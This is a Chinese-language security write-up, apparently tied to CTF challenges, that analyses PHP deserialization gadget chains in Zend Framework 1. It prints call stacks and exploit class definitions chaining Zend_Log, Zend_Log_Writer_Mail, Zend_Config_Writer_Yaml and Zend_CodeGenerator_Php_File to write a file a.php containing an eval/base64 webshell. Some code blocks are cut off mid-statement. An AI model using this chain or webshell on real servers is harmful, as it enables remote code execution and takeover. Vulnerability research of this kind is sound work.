# 前言
在`2020-11-23`号，在`twitter`上看到有师傅发了,`Zend
Framework`框架的一条[反序列化链](https://twitter.com/ptswarm/status/1330878577936625671)。之后也分析了下，找到了几条链子，之后跟了跟其他版本的，都是存在反序列化漏洞的。然后就出了两个题目，一个
最新版的 laminas 和一个ZendFramework 1 的链子。来写下文章抛砖引玉吧，应该还是有很多的链子的。
# 1\. ZEND 1反序列化链分析
## 1.1 获取源码&创建zf1项目
[原pop链地址](https://gist.github.com/YDyachenko/6f60709ce0fc346d0cc0252e07c6aa38)
其实一开始照这个框架就找了我一阵，因为`zend framework`已经到了`zf4`
(laminas)了，而这个反序列化链子是`zf1`，所以我们需要先从`https://github.com/zendframework/zf1`中下载到源码，然后使用
然后进入`bin`目录使用如下命令，来创建一个项目目录`web1`。接着我们把`libary`中的`Zend`目录移动到项目目录`web1/libary`中
    zf create project web1
这样我们就得到了一个`zf1`框架。接着我们修改一下`application\controllers\IndexController.php`
    filter()
    Inflector.php:473, Zend_Filter_Inflector->filter()
    Layout.php:780, Zend_Layout->render()
    Mail.php:371, Zend_Log_Writer_Mail->shutdown()
    Log.php:366, Zend_Log->__destruct()
    IndexController.php:14, IndexController->indexAction()
    ...
    Application.php:384, Zend_Application->run()
    index.php:26, {main}()
整个pop链切入点在`library\Zend\Log.php`中的`__destruct`
这里遍历了`$this->_writers`，并且触发了其中对象的`shutdown()`方法。这里我们使用的是`Zend_Log_Writer_Mail`这个类的`shutdown()`
接着跟进这个`filter`
这里其实可以看到这个链子的亮点就是，两个`filter`函数的调用。以及最后的`create_function`的命令注入。给人的感觉就是这个链子非常连贯。赞
## 1.3. 挖掘潜藏的反序列化链
这里其实还有很多的链子，这里丢一条挺简单的链子。
### 1.3.1 写Shell
先放上调用栈
    File.php:464, Zend_CodeGenerator_Php_File->write()
    Yaml.php:104, Zend_Config_Writer_Yaml->render()
    Mail.php:371, Zend_Log_Writer_Mail->shutdown()
    Log.php:366, Zend_Log->__destruct()
    IndexController.php:14, IndexController->indexAction()
    ...
    Application.php:384, Zend_Application->run()
    index.php:26, {main}()
我们使用`public function render\(\)`这个正则来搜索一下，有没有可以利用的`render()`函数。
最后锁定了`library\Zend\Config\Writer\Yaml.php`
    public function render()
    {
        // 这里可以自己跟一下，很简单就可以绕过的。 
        // $data 可以是任意的。
        $data        = $this->_config->toArray(); 
        $sectionName = $this->_config->getSectionName();
        $extends     = $this->_config->getExtends();
        if (is_string($sectionName)) {
            $data = array($sectionName => $data);
        }
        foreach ($extends as $section => $parentSection) {
            $data[$section][Zend_Config_Yaml::EXTENDS_NAME] = $parentSection;
        }
        // Ensure that each "extends" section actually exists
        foreach ($data as $section => $sectionData) {
            if (is_array($sectionData) && isset($sectionData[Zend_Config_Yaml::EXTENDS_NAME])) {
                $sectionExtends = $sectionData[Zend_Config_Yaml::EXTENDS_NAME];
                if (!isset($data[$sectionExtends])) {
                    // Remove "extends" declaration if section does not exist
                    unset($data[$section][Zend_Config_Yaml::EXTENDS_NAME]);
                }
            }
        }
        return call_user_func($this->getYamlEncoder(), $data);
    }
这里我们可以看到，最后的`call_user_func($this->getYamlEncoder(),
$data);`。其实这里我利用的`可变函数`这个点，来扩大利用。看下面这个`demo`
跟进一下`$this->getYamlEncoder()`函数。
可以发现这个可控的，所以我们可以另其为一个数组，其中第一个函数是类，然后第二个参数是类中的方法名。那么我们就可以利用这个技巧，调用任何类中的任何方法。
所以这里我们找一下，有没有直接写shell的点。
这里通过搜索，我们找到了一个，没有参数的`write`方法，并且这个方法中的一些参数，都是我们完全可以控制的。我们接着跟进一下`$this->generate()`
这里我们可以看到，`body`是我们可以控制的，并且直接拼接到了`output`当中,所以我们写入的内容也是可控的。所以答案也就呼之欲出了
    _writers = [new Zend_Log_Writer_Mail()];
        }
    }
    class Zend_Log_Writer_Mail
    {
        protected $_eventsToMail;
        protected $_mail;
        protected $_layoutEventsToMail;
        protected $_layout;
        function __construct()
        {
            $this->_mail = new Zend_Mail();
            $this->_eventsToMail = [1];
            $this->_layoutEventsToMail = "";
            $this->_layout = new Zend_Config_Writer_Yaml();
        }
    }
    class Zend_CodeGenerator_Php_File
    {
        protected $_filename;
        protected $_body;
        function __construct()
        {
            $this->_filename = "a.php";
            $this->_body = '@eval(base64_decode($_POST["Mrkaixin"]));';
        }
    }
    class Zend_Config
    {
        protected $_data;
        protected $_loadedSection;
        protected $_extends;
        function __construct()
        {
            $this->_loadedSection = "Mrkaixin";
            $this->_data = [];
            $this->_extends = "Mrkaixin";
        }
    }